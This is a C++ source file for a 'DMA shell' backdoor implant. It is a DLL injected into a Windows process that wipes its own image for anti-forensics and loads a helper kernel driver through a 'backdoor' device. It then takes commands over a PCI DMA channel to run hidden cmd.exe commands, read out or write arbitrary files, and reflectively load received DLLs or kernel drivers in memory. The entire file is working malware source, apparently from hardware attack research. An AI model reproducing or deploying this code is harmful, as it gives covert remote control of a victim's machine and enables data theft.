#include "stdafx.h"

#ifdef DEBUG_BUILD

// debug driver image
#include "../dma_shell_kernel_debug_sys.h"

#else

// release driver immage
#include "../dma_shell_kernel_sys.h"

#endif

// chunk size to transfer the file data
#define IO_BUFFER_SIZE MEM_SHARED_DATA_SIZE

// various options for HandleExec()
#define EXEC_CODE_PAGE 65001
#define EXEC_BUFFER_SIZE 0x100

typedef BOOL (* PROT_HANDLER)(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);

// list of the protocol command handlers
BOOL HandlePing(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);
BOOL HandleExec(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);
BOOL HandleDownload(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);
BOOL HandleUpload(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);
BOOL HandleLoadImage(PDEVICE_CONTEXT Ctx, PPROT_CTL Request);

struct
{
    DWORD Code;
    PROT_HANDLER Handler;
}
m_Handlers[] =
{
    { PROT_CMD_PING,        HandlePing      },
    { PROT_CMD_EXEC,        HandleExec      },
    { PROT_CMD_DOWNLOAD,    HandleDownload  },
    { PROT_CMD_UPLOAD,      HandleUpload    },
    { PROT_CMD_LOAD_IMAGE,  HandleLoadImage },
    { 0,                    NULL            }
};
//--------------------------------------------------------------------------------------
typedef BOOL (WINAPI * DLL_MAIN)(
    PVOID hinstDLL,
    ULONG fdwReason,
    PVOID lpvReserved
);

DWORD WINAPI LoadDynamicLibraryThread(LPVOID lpParam)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        lpParam, ((PIMAGE_DOS_HEADER)lpParam)->e_lfanew);

    // get image entry point address
    DLL_MAIN DllEntry = (DLL_MAIN)RVATOVA(lpParam, pHeaders->OptionalHeader.AddressOfEntryPoint);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image entry is at "IFMT"\n", lpParam);

    // call image entry point
    if (!DllEntry(lpParam, DLL_PROCESS_ATTACH, NULL))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Image entry returned an error\n");
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): EXIT\n");

    return 0;
}

BOOL LoadDynamicLibrary(PUCHAR Data, DWORD dwDataSize)
{
    BOOL bRet = FALSE;
    PVOID Image = NULL;
    DWORD dwImageSize = 0;

    // map image into the memory
    if (!LdrImageFromData(Data, dwDataSize, &Image, &dwImageSize))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrImageFromData() fails\n");
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image address is "IFMT"\n", Image);

    // parse relocations and imports
    if (LdrProcessRelocs(Image, Image))
    {
        if (RuntimeProcessImports(Image))
        {
            PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
                Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

            // set proper memory protection on image sections
            ImageFixSectionsProtection(Image);

            if (pHeaders->OptionalHeader.AddressOfEntryPoint != 0)
            {
                // call image entry point in separate thread to prevent blocking of the command loop
                HANDLE hThread = CreateThread(NULL, 0, LoadDynamicLibraryThread, Image, 0, NULL);
                if (hThread)
                {
                    bRet = TRUE;
                    CloseHandle(hThread);
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
                }                
            }
            else
            {
                bRet = TRUE;
            }                       
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RuntimeProcessImports() fails\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrProcessRelocs() fails\n");
    }

    if (!bRet)
    {
        // unsuccessful, free image memory
        VirtualFree(Image, 0, MEM_RELEASE);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL HandlePing(PDEVICE_CONTEXT Ctx, PPROT_CTL Request)
{
    PROT_CTL Reply;
    DWORD Status = 0;

    Reply.Code = PROT_CMD_SUCCESS;
    Reply.Size = 0;

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\n");

    // send reply to the device
    if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
        return FALSE;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOL HandleExec(PDEVICE_CONTEXT Ctx, PPROT_CTL Request)
{    
    DWORD Status = 0;
    BOOL bRet = FALSE;

    PROT_CTL Reply;
    PROT_CTL_EXEC_REPLY ReplyParams;    

    Reply.Code = PROT_CMD_ERROR;
    Reply.Size = sizeof(ReplyParams);
    ReplyParams.ExitCode = -1;

    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFOW StartupInfo;
    HANDLE hConsoleInput = NULL, hInput = NULL;
    HANDLE hConsoleOutput = NULL, hOutput = NULL;

    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
    ZeroMemory(&StartupInfo, sizeof(StartupInfo));

    SECURITY_ATTRIBUTES SecAttr;
    SecAttr.lpSecurityDescriptor = NULL;
    SecAttr.nLength = sizeof(SecAttr);
    SecAttr.bInheritHandle = TRUE;

    PUCHAR Output = NULL;
    DWORD dwOutputMax = PAGE_SIZE, dwOutputSize = 0;

    if (Request->Size <= sizeof(PROT_CTL_EXEC_REQUEST))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unexpected request size\n");
        return FALSE;
    }

    // allocate request parameters
    PPROT_CTL_EXEC_REQUEST RequestParams = (PPROT_CTL_EXEC_REQUEST)M_ALLOC(Request->Size);
    if (RequestParams == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // receive request parameters
    if ((Status = DeviceRecv(Ctx, (PUCHAR)RequestParams, Request->Size)) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);        
        M_FREE(RequestParams);        
        return FALSE;
    }    

    // allocate command line
    PWSTR lpszCommand = (PWSTR)M_ALLOC((MAX_PATH + wcslen(RequestParams->Command)) * sizeof(WCHAR));
    if (lpszCommand == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    DWORD dwStarted = GetTickCount();
    DWORD dwTimeout = RequestParams->Timeout, dwExitCode = 0;

    // exxecute chcp to switch console output to the UTF-16
    wsprintfW(lpszCommand, L"cmd.exe /C \"chcp %d > NUL & %s\"", EXEC_CODE_PAGE, RequestParams->Command);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Timeout = %d, \"%ws\"\n", dwTimeout, lpszCommand);

    // allocate command output buffer
    if ((Output = (PUCHAR)M_ALLOC(dwOutputMax)) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    if (!CreatePipe(&hConsoleInput, &hInput, &SecAttr, 0))
    {
        DbgMsg(__FILE__, __LINE__, "CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    }

    if (!CreatePipe(&hOutput, &hConsoleOutput, &SecAttr, 0))
    {
        DbgMsg(__FILE__, __LINE__, "CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    } 

    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = FALSE;
    StartupInfo.hStdError = StartupInfo.hStdOutput = hConsoleOutput;
    StartupInfo.hStdInput = hConsoleInput;    

    // run the proccess
    if (CreateProcessW(NULL, lpszCommand, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo))
    {        
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Process %d started\n", ProcessInfo.dwProcessId);        

        while (true)
        {
            UCHAR Buff[EXEC_BUFFER_SIZE];
            DWORD dwRead = 0, dwAvailable = 0;            

            // check if there's any command output data to read
            if (!PeekNamedPipe(hOutput, NULL, NULL, NULL, &dwAvailable, NULL))
            {
                DbgMsg(__FILE__, __LINE__, "PeekNamedPipe() ERROR %d\n", GetLastError());
                break;
            }

            if (dwAvailable == 0)
            {
                if (GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode))
                {
                    if (dwExitCode != STILL_ACTIVE)
                    {
                        // process was terminated
                        break;
                    }
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "GetExitCodeProcess() ERROR %d\n", GetLastError());
                    break;
                }

                if (dwTimeout != 0 && GetTickCount() - dwStarted >= dwTimeout)
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Timeout occurred\n");
                    break;
                }

                SwitchToThread();
                continue;
            }

            // read command output data
            if (!ReadFile(hOutput, Buff, min(sizeof(Buff), dwAvailable), &dwRead, NULL))
            {
                DbgMsg(__FILE__, __LINE__, "ReadFile() ERROR %d\n", GetLastError());
                break;
            }

            if (dwRead == 0)
            {
                continue;
            }

            if (dwRead + dwOutputSize >= dwOutputMax)
            {
                dwOutputMax += PAGE_SIZE;

                // reallocate output buffer
                PUCHAR Temp = (PUCHAR)M_ALLOC(dwOutputMax);
                if (Temp == NULL)
                {
                    DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
                    break;
                }

                // copy existing data to the new output buffer
                memcpy(Temp, Output, dwOutputSize);
                M_FREE(Output);

                Output = Temp;
            }

            // copy new data to the output buffer
            memcpy(Output + dwOutputSize, Buff, dwRead);
            dwOutputSize += dwRead;
        }

        if (GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode))
        {
            if (dwExitCode == STILL_ACTIVE)
            {
                // terminate the process if it's still active
                if (!TerminateProcess(ProcessInfo.hProcess, 0))
                {
                    DbgMsg(__FILE__, __LINE__, "TerminateProcess() ERROR %d\n", GetLastError());
                }

                DbgMsg(
                    __FILE__, __LINE__, __FUNCTION__"(): Process %d was terminated by timeout\n", 
                    ProcessInfo.dwProcessId
                );               

                ReplyParams.ExitCode = ERROR_TIMEOUT;
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, __FUNCTION__"(): Process %d terminated, exit code = 0x%.8x\n", 
                    ProcessInfo.dwProcessId, dwExitCode
                );

                ReplyParams.ExitCode = dwExitCode;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "GetExitCodeProcess() ERROR %d\n", GetLastError());
        }

        Reply.Code = PROT_CMD_SUCCESS;
        Reply.Size += dwOutputSize;        
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CreateProcess() ERROR %d\n", GetLastError());
    }

_end:

    if (Reply.Code != PROT_CMD_SUCCESS)
    {
        // send error code in case of failure        
        ReplyParams.ExitCode = GetLastError();
    }

    // send reply to the device
    if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) == ERROR_SUCCESS)
    {
        // send reply parameters to the device
        if ((Status = DeviceSend(Ctx, (PUCHAR)&ReplyParams, sizeof(ReplyParams))) == ERROR_SUCCESS)
        {
            if (dwOutputSize > 0)
            {
                // send command output to the device
                if ((Status = DeviceSend(Ctx, Output, dwOutputSize)) == ERROR_SUCCESS)
                {
                    bRet = TRUE;
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
                }
            }
            else
            {
                bRet = TRUE;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
    }    

    if (ProcessInfo.hProcess)
    {
        CloseHandle(ProcessInfo.hProcess);
    }

    if (ProcessInfo.hThread)
    {
        CloseHandle(ProcessInfo.hThread);
    }

    if (hOutput)
    {
        CloseHandle(hOutput);
    }

    if (hConsoleOutput)
    {
        CloseHandle(hConsoleOutput);
    }

    if (hInput)
    {
        CloseHandle(hInput);
    }

    if (hConsoleInput)
    {
        CloseHandle(hConsoleInput);
    }

    if (Output)
    {
        M_FREE(Output);
    }

    if (lpszCommand)
    {
        M_FREE(lpszCommand);
    }

    if (RequestParams)
    {
        M_FREE(RequestParams);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL HandleDownload(PDEVICE_CONTEXT Ctx, PPROT_CTL Request)
{
    DWORD Status = 0;
    BOOL bRet = TRUE;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    PROT_CTL Reply;

    Reply.Code = PROT_CMD_ERROR;
    Reply.Size = 0;

    // allocate request parameters
    PPROT_CTL_DOWNLOAD_REQUEST RequestParams = (PPROT_CTL_DOWNLOAD_REQUEST)M_ALLOC(Request->Size);
    if (RequestParams == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // receive request parameters
    if ((Status = DeviceRecv(Ctx, (PUCHAR)RequestParams, Request->Size)) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);
        M_FREE(RequestParams);
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%ws\"\n", RequestParams->Path);

    if ((hFile = CreateFileW(
        RequestParams->Path,
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
    {
        DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
        goto _end;
    }
        
    DWORD dwFileSizeHigh = 0;
    DWORD dwFileSize = GetFileSize(hFile, &dwFileSizeHigh);

    // must be more than zero and less than 4GB
    if (dwFileSize == 0 || dwFileSizeHigh != 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Bad file size\n");
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Sending %d bytes of the file contents\n", dwFileSize);    

    Reply.Code = PROT_CMD_SUCCESS;
    Reply.Size = dwFileSize;

_end:

    // send reply to the device
    if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) == ERROR_SUCCESS)
    {
        if (Reply.Code == PROT_CMD_SUCCESS)
        {
            while (true)
            {
                UCHAR Buff[IO_BUFFER_SIZE];
                DWORD dwRead = 0;

                // read file contents
                if (!ReadFile(hFile, Buff, sizeof(Buff), &dwRead, NULL))
                {
                    DbgMsg(__FILE__, __LINE__, "ReadFile() ERROR %d\n", GetLastError());
                    bRet = FALSE;
                    break;
                }

                if (dwRead == 0)
                {
                    // end of file
                    break;
                }

                // send data to the device
                if ((Status = DeviceSend(Ctx, Buff, dwRead)) != ERROR_SUCCESS)
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
                    bRet = FALSE;
                    break;
                }
            }

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Transfer complete\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
        bRet = FALSE;
    }                 

    if (hFile)
    {
        CloseHandle(hFile);
    }

    if (RequestParams)
    {
        M_FREE(RequestParams);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL HandleUpload(PDEVICE_CONTEXT Ctx, PPROT_CTL Request)
{
    DWORD Status = 0;
    BOOL bRet = TRUE;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    PROT_CTL Reply;

    Reply.Code = PROT_CMD_ERROR;
    Reply.Size = 0;

    if (Request->Size <= sizeof(PROT_CTL_UPLOAD_REQUEST))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unexpected request size\n");
        return FALSE;
    }

    // allocate request parameters
    PPROT_CTL_UPLOAD_REQUEST RequestParams = (PPROT_CTL_UPLOAD_REQUEST)M_ALLOC(Request->Size);
    if (RequestParams == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // receive request parameters
    if ((Status = DeviceRecv(Ctx, (PUCHAR)RequestParams, Request->Size)) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);
        M_FREE(RequestParams);
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%ws\"\n", RequestParams->Path);

    if ((hFile = CreateFileW(
        RequestParams->Path,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Receiving %d bytes of the file contents\n", RequestParams->FileSize);

    Reply.Code = PROT_CMD_SUCCESS;

_end:

    // send reply to the device
    if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) == ERROR_SUCCESS)
    {
        if (Reply.Code == PROT_CMD_SUCCESS)
        {
            DWORD dwReceived = 0;

            while (dwReceived < RequestParams->FileSize)
            {
                UCHAR Buff[IO_BUFFER_SIZE];
                DWORD dwReadSize = min(RequestParams->FileSize - dwReceived, sizeof(Buff)), dwWritten = 0;

                // receive file contents
                if ((Status = DeviceRecv(Ctx, Buff, dwReadSize)) != ERROR_SUCCESS)
                {
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);
                    bRet = FALSE;
                    break;
                }

                // write data into the file
                if (!WriteFile(hFile, Buff, dwReadSize, &dwWritten, NULL))
                {
                    DbgMsg(__FILE__, __LINE__, "WriteFile() ERROR %d\n", GetLastError());
                    bRet = FALSE;
                    break;
                }

                dwReceived += dwReadSize;
            }

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Transfer complete\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
        bRet = FALSE;
    }

    if (hFile)
    {
        CloseHandle(hFile);
    }

    if (RequestParams)
    {
        M_FREE(RequestParams);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL HandleLoadImage(PDEVICE_CONTEXT Ctx, PPROT_CTL Request)
{
    DWORD Status = 0;
    BOOL bRet = TRUE;

    PROT_CTL Reply;

    Reply.Code = PROT_CMD_ERROR;
    Reply.Size = 0;

    // allocate memory for the image data
    PUCHAR Data = (PUCHAR)M_ALLOC(Request->Size);
    if (Data == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // receive image contents
    if ((Status = DeviceRecv(Ctx, Data, Request->Size)) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);
        M_FREE(Data);
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image size is %d bytes\n", Request->Size);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)Data;

    // sanity check
    if (Request->Size < PAGE_SIZE && pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid image data\n");
        goto _end;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(Data, pDosHeader->e_lfanew);

    // check for the supported machine type
    if (pHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
    {

#ifdef _X86_

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        goto _end;
#endif

    }
    else if (pHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {

#ifdef _AMD64_

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        goto _end;
#endif

    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        goto _end;
    }

    // determine image type by subsystem and characteristics
    if (pHeaders->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI)
    {
        // check for the DLL image
        if (!(pHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not a DLL\n");
            goto _end;
        }

        // load image as dynamic library
        if (LoadDynamicLibrary(Data, Request->Size))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Dynamic library was successfully loaded\n");
            Reply.Code = PROT_CMD_SUCCESS;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LoadDynamicLibrary() fails\n");
        }
    }
    else if (pHeaders->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE)
    {
        // load image as kernel driver 
        if (BackdoorLoadDriver(Data, Request->Size, FALSE))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Driver was successfully loaded\n");
            Reply.Code = PROT_CMD_SUCCESS;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: BackdoorLoadDriver() fails\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported subsystem\n");
    }

_end:

    // send reply to the device
    if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) != ERROR_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
        bRet = FALSE;
    }

    if (Data)
    {
        M_FREE(Data);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL Communicate(PDEVICE_CONTEXT Ctx)
{
    PROT_CTL Request, Reply;

    Reply.Code = PROT_CMD_ERROR;
    Reply.Size = 0;

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Receving commands from the device...\n");

    while (true)
    {
        DWORD Status = 0;
        PROT_HANDLER Handler = NULL;  

        // receive request from the device
        if ((Status = DeviceRecv(Ctx, (PUCHAR)&Request, sizeof(Request), 0)) != ERROR_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceRecv() ERROR %d\n", Status);
            
            // reset the transport state
            DeviceReset(Ctx);
            continue;
        }
        
        for (int i = 0; m_Handlers[i].Handler != NULL; i += 1)
        {
            // find the command handler
            if (m_Handlers[i].Code == Request.Code)
            {
                Handler = m_Handlers[i].Handler;
                break;
            }
        }

        if (Handler)
        {
            // call the command specific handler
            if (!Handler(Ctx, &Request))
            {
                // reset transport state
                DeviceReset(Ctx);
            }

            continue;
        }

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unknown code %d\n", Request.Code);

        // send error code reply to the device
        if ((Status = DeviceSend(Ctx, (PUCHAR)&Reply, sizeof(Reply))) != ERROR_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): DeviceSend() ERROR %d\n", Status);
            
            // reset the transport state
            DeviceReset(Ctx);
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOL Main(PVOID Image)
{
    BOOL bRet = FALSE;
    DEVICE_CONTEXT Ctx;

#ifdef USE_ANTI_FORENSICS

    ImageWipe(Image);

#endif

    // open backdoor device driver
    if (BackdoorOpen())
    {
        // load our own driver
        if (BackdoorLoadDriver(driver, sizeof(driver), TRUE))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Helper driver successfully loaded\n");
        }        
    }
    else
    {
        goto _end;
    }

    // open helper device driver
    if (!HelperOpen())
    {
        goto _end;
    }               

    // open shared memory
    bRet = DeviceOpen(&Ctx, PCI_VENDOR_ID, PCI_DEVICE_ID);

_end:

    // unregister and close helper device
    HelperDeviceUnregister();
    HelperClose();

    if (bRet)
    {
        // main loop
        return Communicate(&Ctx);
    }

    BackdoorClose();

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdreason, LPVOID lpvReserved)
{
    switch (fwdreason)
    {
    case DLL_PROCESS_ATTACH:
        {
            char szProcessModule[MAX_PATH];

            memset(szProcessModule, 0, sizeof(szProcessModule));
            GetModuleFileName(GetModuleHandle(NULL), szProcessModule, MAX_PATH);
    
            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__ "(): DMA shell injected into the '%s' (PID: %d)\n", 
                szProcessModule, GetCurrentProcessId()
            );

            /* 
                Run main code in the same thread to prevent loader from unregistering
                backdoor driver communication device.
            */
            return Main(hinstDLL);
        }

    case DLL_PROCESS_DETACH:
        {
            break;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF 
